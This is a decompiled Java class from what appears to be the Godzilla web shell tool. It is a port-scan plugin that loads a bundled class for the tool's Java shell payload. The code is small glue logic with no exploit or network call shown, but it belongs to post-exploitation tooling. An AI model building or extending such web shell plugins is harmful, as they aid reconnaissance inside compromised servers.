/*    */ package shells.plugins.java;
/*    */ 
/*    */ import core.annotation.PluginAnnotation;
/*    */ import java.io.IOException;
/*    */ import java.io.InputStream;
/*    */ import shells.plugins.generic.PortScan;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ 
/*    */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "PortScan", DisplayName = "端口扫描")
/*    */ public class JPortScan
/*    */   extends PortScan
/*    */ {
/*    */   private static final String CLASS_NAME = "plugin.JPortScan";
/*    */   
/*    */   public byte[] readPlugin() throws IOException {
/* 18 */     InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.classs", new Object[] { "plugin.JPortScan".substring("plugin.JPortScan".indexOf(".") + 1) }));
/* 19 */     return functions.readInputStreamAutoClose(inputStream);
/*    */   }
/*    */ 
/*    */   
/*    */   public String getClassName() {
/* 24 */     return "plugin.JPortScan";
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\JPortScan.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */